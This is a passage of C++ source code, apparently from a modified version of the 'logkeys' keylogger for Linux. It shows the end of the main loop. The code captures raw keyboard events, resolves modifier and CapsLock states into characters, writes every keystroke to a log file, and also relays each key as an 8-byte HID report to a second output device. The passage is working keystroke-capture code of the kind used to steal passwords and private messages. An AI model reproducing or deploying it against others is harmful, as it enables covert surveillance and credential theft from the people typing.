        continue;  // but don't log "<Enter>"
      }
      
      if (scan_code == KEY_CAPSLOCK) {
		  //capslock_in_effect = !capslock_in_effect;
		  //fprintf(out, "Output code (capslock):%d\n", capslock_in_effect);
		  
		  if (capslock_in_effect == false && shift_in_effect == false)
			  output_code[0] = output_code[0] & 0x0d;
		  //fprintf(out, "Output code (capslock):%d\n", output_code[0]);
	  }

      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
        shift_in_effect = true;
      if (scan_code == KEY_RIGHTALT || scan_code == KEY_LEFTALT)
        altgr_in_effect = true;
      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
        ctrl_in_effect = true;
	  if (scan_code == KEY_LEFTMETA || scan_code == KEY_RIGHTMETA)
		meta_in_effect = true;
      
      // print character or string coresponding to received keycode; only print chars when not \0
      if (is_char_key(scan_code)) {
        wchar_t wch;
        if (altgr_in_effect) {
          wch = altgr_keys[to_char_keys_index(scan_code)];
          if (wch == L'\0') {
            if(shift_in_effect)
              wch = shift_keys[to_char_keys_index(scan_code)];
            else
              wch = char_keys[to_char_keys_index(scan_code)];
          }
        } 

        else if (capslock_in_effect && iswalpha(char_keys[to_char_keys_index(scan_code)])) { // only bother with capslock if alpha
          if (shift_in_effect) // capslock and shift cancel each other
            wch = char_keys[to_char_keys_index(scan_code)];
          else
            wch = shift_keys[to_char_keys_index(scan_code)];
          if (wch == L'\0')
            wch = char_keys[to_char_keys_index(scan_code)];
        }
        
        else if (shift_in_effect) {
          wch = shift_keys[to_char_keys_index(scan_code)];
          if (wch == L'\0')
            wch = char_keys[to_char_keys_index(scan_code)];
        }
        else  // neither altgr nor shift are effective, this is a normal char
          wch = char_keys[to_char_keys_index(scan_code)];
        
        if (wch != L'\0') {
          inc_size += fprintf(out, "%lc", wch);  // write character to log file
          //ADDED KEYOUT PRINT
          //fprintf(out, "\\%x\\%x\\x%x\\%x\\%x\\%x\\%x\\%x", 0,0,21,0,0,0,0,0);
          //sprintf(cmd, "\\%x\\%x\\x%x\\%x\\%x\\%x\\%x\\%x", 0,0,21,0,0,0,0,0);
          //fprintf(out, "Input code:%d\n", scan_code);
		  if (is_char_key(scan_code)) {

			output_code[2] = translate_code(scan_code);          
          
			//printf("%d", scan_code);
			if (shift_in_effect) //|| capslock_in_effect)
			  output_code[0] = output_code[0] | 0x02;
			if (ctrl_in_effect)
				output_code[0] = output_code[0] | 0x01;
			if (altgr_in_effect)
				output_code[0] = output_code[0] | 0x04;
			if (meta_in_effect)
				output_code[0] = output_code[0] | 0x08;
			//fprintf(out, "Output code (char):%d\n", output_code[0]);
			write(output_fd, output_code, 8);
			//sprintf(cmd, "\\%x\\%x\\%x\\%x\\%x\\%x\\%x\\%x", 0,0,0,0,0,0,0,0);
			//write(output_fd, output_null, 8);
		  }
        }

      }
      else if (is_func_key(scan_code)) {
        if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
			inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
			//ADDED not quite right for numlock on or off
			//fprintf(out, "Enter code (func):%d\n", scan_code);
			//ADDED - HANDLE SHIFT,ALT, and CTRL elsewhere...do not ouput directly.
			if (shift_in_effect) //|| capslock_in_effect) 
			  output_code[0] = output_code[0] | 0x02;
			if (ctrl_in_effect)
				output_code[0] = output_code[0] | 0x01;
			if (altgr_in_effect)
				output_code[0] = output_code[0] | 0x04;
			if (meta_in_effect)
				output_code[0] = output_code[0] | 0x08;
			//if (scan_code == KEY_CAPSLOCK)
				//output_code[0] = output_code[0] & 0x0d;
			//if (!(shift_in_effect || altgr_in_effect || ctrl_in_effect)) {
			//fprintf(out, "Output code (func):%d\n", output_code[0]);
			output_code[2] = translate_code(scan_code);          
			write(output_fd, output_code, 8);
			//write(output_fd, output_null, 8);
			//}
        } 
        else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
          inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
          //ADDED
          fprintf(out, "Enter code (space or tab):%d\n", scan_code);
		  if (altgr_in_effect)
			output_code[0] = output_code[0] | 0x04;
          output_code[2] = translate_code(scan_code);          
          write(output_fd, output_code, 8);
          //write(output_fd, output_null, 8);
        }
      }
      else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
    } // if (EV_MAKE)
    
    // on key release
    if (event.value == EV_BREAK) {
      //ADDED
      if (is_char_key(scan_code) || is_func_key(scan_code))
        output_code[2] = 0x00;
	  write(output_fd, output_code, 8);
		//END
      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL) {
        ctrl_in_effect = false;
		output_code[0] = output_code[0] & 0x0e;
		write(output_fd, output_code, 8);
	  }
	  if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT) {
        shift_in_effect = false;
		output_code[0] = output_code[0] & 0x0d;
		write(output_fd, output_code, 8);
	  }
      if (scan_code == KEY_RIGHTALT || scan_code == KEY_LEFTALT) {
        altgr_in_effect = false;
		output_code[0] = output_code[0] & 0x0b;
		write(output_fd, output_code, 8);
	  }
      if (scan_code == KEY_LEFTMETA || scan_code == KEY_RIGHTMETA) {
		meta_in_effect = false;
		output_code[0] = output_code[0] & 0x07;
		write(output_fd, output_code, 8);
	  }
    }
    
    prev_code = scan_code;
    fflush(out);
    if (inc_size > 0) file_size += inc_size;
    
  } // while (read(input_fd))
  
  // append final timestamp, close files and exit
  time(&cur_time);
  strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
  fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
  
  fclose(out);
  close(output_fd);
  
  remove(PID_FILE);
  
  exit(EXIT_SUCCESS);
} // main()

} // namespace logkeys

int main(int argc, char** argv)
{
  return logkeys::main(argc, argv);
}

